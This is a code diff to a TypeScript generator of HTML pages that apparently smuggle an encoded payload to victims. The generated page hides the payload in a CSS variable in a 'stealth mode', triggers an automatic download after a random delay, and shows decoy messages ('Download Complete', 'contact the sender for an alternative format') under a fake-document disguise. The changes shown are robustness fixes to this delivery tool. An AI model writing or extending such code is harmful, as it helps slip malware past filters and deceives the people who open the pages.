@@ -254,9 +254,7 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           // Get payload data
           ${storageMethod === 'css' && stealthMode 
             ? "const payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
-            : storageCode.includes('payloadData') 
-              ? storageCode 
-              : `const payloadData = '${encodedData}';`
+            : `const payloadData = '${encodedData}';`
           }
           
           if (!payloadData) {
@@ -281,9 +279,15 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
             document.body.removeChild(a);
             
             ${fakeDoc ? `
-            document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
+            const container = document.querySelector('.container');
+            if (container) {
+              container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
+            }
             ` : `
-            document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
+            const container = document.querySelector('.container');
+            if (container) {
+              container.innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
+            }
             `}
           }, Math.random() * 2000 + 1000);
           ` : `
@@ -295,11 +299,17 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           downloadBtn.textContent = '📄 Download ${fileName}';
           
           ${fakeDoc ? `
-          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
-          document.querySelector('.container').appendChild(downloadBtn);
+          const container = document.querySelector('.container');
+          if (container) {
+            container.innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
+            container.appendChild(downloadBtn);
+          }
           ` : `
-          document.querySelector('.container').innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
-          document.querySelector('.container').appendChild(downloadBtn);
+          const container = document.querySelector('.container');
+          if (container) {
+            container.innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
+            container.appendChild(downloadBtn);
+          }
           `}
           `}
           
@@ -309,11 +319,17 @@ async function generateHTMLTemplate(params: TemplateParams): Promise<string> {
           }, 30000);
           
         } catch (error) {
-          console.warn('Document processing issue:', error.message);
+          console.error('Payload processing error:', error);
           ${fakeDoc ? `
-          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
+          const container = document.querySelector('.container');
+          if (container) {
+            container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
+          }
           ` : `
-          document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
+          const container = document.querySelector('.container');
+          if (container) {
+            container.innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
+          }
           `}
         }
       })();
